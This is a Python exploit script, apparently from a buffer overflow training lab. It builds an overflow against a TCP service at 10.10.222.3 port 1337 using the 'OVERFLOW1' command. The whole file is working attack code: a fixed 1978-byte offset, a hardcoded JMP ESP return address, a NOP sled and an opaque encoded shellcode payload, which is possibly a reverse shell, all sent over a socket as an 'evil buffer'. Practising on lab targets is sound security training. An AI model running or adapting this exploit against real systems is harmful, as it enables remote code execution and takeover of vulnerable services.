import socket

ip = "10.10.222.3"
port = 1337

prefix = "OVERFLOW1 "
offset = 1978
overflow = "A" * offset
#jmp esp - 0x62 50 11 af
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
#Excluded - \x00\x07\x2e\xa0
payload =("\xbb\xbc\x3a\x2d\xef\xdd\xc3\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
"\x52\x31\x5d\x12\x03\x5d\x12\x83\x51\xc6\xcf\x1a\x55\xdf\x92"
"\xe5\xa5\x20\xf3\x6c\x40\x11\x33\x0a\x01\x02\x83\x58\x47\xaf"
"\x68\x0c\x73\x24\x1c\x99\x74\x8d\xab\xff\xbb\x0e\x87\x3c\xda"
"\x8c\xda\x10\x3c\xac\x14\x65\x3d\xe9\x49\x84\x6f\xa2\x06\x3b"
"\x9f\xc7\x53\x80\x14\x9b\x72\x80\xc9\x6c\x74\xa1\x5c\xe6\x2f"
"\x61\x5f\x2b\x44\x28\x47\x28\x61\xe2\xfc\x9a\x1d\xf5\xd4\xd2"
"\xde\x5a\x19\xdb\x2c\xa2\x5e\xdc\xce\xd1\x96\x1e\x72\xe2\x6d"
"\x5c\xa8\x67\x75\xc6\x3b\xdf\x51\xf6\xe8\x86\x12\xf4\x45\xcc"
"\x7c\x19\x5b\x01\xf7\x25\xd0\xa4\xd7\xaf\xa2\x82\xf3\xf4\x71"
"\xaa\xa2\x50\xd7\xd3\xb4\x3a\x88\x71\xbf\xd7\xdd\x0b\xe2\xbf"
"\x12\x26\x1c\x40\x3d\x31\x6f\x72\xe2\xe9\xe7\x3e\x6b\x34\xf0"
"\x41\x46\x80\x6e\xbc\x69\xf1\xa7\x7b\x3d\xa1\xdf\xaa\x3e\x2a"
"\x1f\x52\xeb\xfd\x4f\xfc\x44\xbe\x3f\xbc\x34\x56\x55\x33\x6a"
"\x46\x56\x99\x03\xed\xad\x4a\x26\xe3\x86\x1c\x5e\x01\xd8\x31"
"\xc3\x8c\x3e\x5b\xeb\xd8\xe9\xf4\x92\x40\x61\x64\x5a\x5f\x0c"
"\xa6\xd0\x6c\xf1\x69\x11\x18\xe1\x1e\xd1\x57\x5b\x88\xee\x4d"
"\xf3\x56\x7c\x0a\x03\x10\x9d\x85\x54\x75\x53\xdc\x30\x6b\xca"
"\x76\x26\x76\x8a\xb1\xe2\xad\x6f\x3f\xeb\x20\xcb\x1b\xfb\xfc"
"\xd4\x27\xaf\x50\x83\xf1\x19\x17\x7d\xb0\xf3\xc1\xd2\x1a\x93"
"\x94\x18\x9d\xe5\x98\x74\x6b\x09\x28\x21\x2a\x36\x85\xa5\xba"
"\x4f\xfb\x55\x44\x9a\xbf\x76\xa7\x0e\xca\x1e\x7e\xdb\x77\x43"
"\x81\x36\xbb\x7a\x02\xb2\x44\x79\x1a\xb7\x41\xc5\x9c\x24\x38"
"\x56\x49\x4a\xef\x57\x58")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
